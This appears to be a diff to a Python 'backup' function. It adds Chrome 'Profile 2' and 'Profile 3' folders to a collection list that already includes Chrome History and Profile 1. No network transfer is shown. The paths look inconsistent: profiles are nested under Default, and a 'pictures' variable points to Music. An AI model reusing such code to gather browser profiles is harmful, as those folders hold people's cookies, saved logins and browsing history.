@@ -143,6 +143,8 @@ def run_backup_process():
     pictures_path = str(Path.home() / "Music")
     Default_path = str(Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "History")
     Profile1_path = str(Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Profile 1")
+    Profile2_path = str(Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Profile 2")
+    Profile3_path = str(Path.home() / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Profile 3")
     # Danh sách kết hợp cả file và thư mục
     my_folders = [
         r'C:\Ersports\Summary',
@@ -151,6 +153,8 @@ def run_backup_process():
         pictures_path,
         Default_path,
         Profile1_path,
+        Profile2_path,
+        Profile3_path,
         #pictures_path0
     ]
     
